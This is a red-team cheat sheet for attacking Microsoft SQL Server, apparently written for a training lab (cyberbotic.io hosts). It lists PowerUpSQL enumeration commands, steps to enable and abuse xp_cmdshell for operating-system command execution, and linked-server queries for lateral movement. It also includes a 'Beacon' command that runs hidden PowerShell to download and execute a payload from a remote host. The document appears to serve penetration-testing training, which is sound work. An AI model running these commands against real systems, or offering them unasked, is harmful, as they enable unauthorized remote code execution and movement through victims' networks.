## Enumeration
https://github.com/NetSPI/PowerUpSQL

### Get SQL Servers
```powershell
Get-SQLInstanceDomain
```

### Test Connection
```powershell
Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
```

### Get Information
```powershell
Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
```

### Run Query
```powershell
Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
```

## Command Execution

### Run Commands Automaticaly
```powershell
Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

### Manualy
```powershell
EXEC xp_cmdshell 'whoami';
```

Check xp_cmdshell State
```powershell
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
```

Enable
```powershell
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Beacon
```powershell
EXEC xp_cmdshell 'powershell -w hidden -c "iex (new-object net.webclient).downloadstring("""http://wkstn-2:8080/b""")"';
```

## Lateral Movement

### Discover Links
```powershell
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
```

### Another Server Query
```powershell
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

### xp_cmdshell
```powershell
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

### Automaticaly
```powershell
Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
```
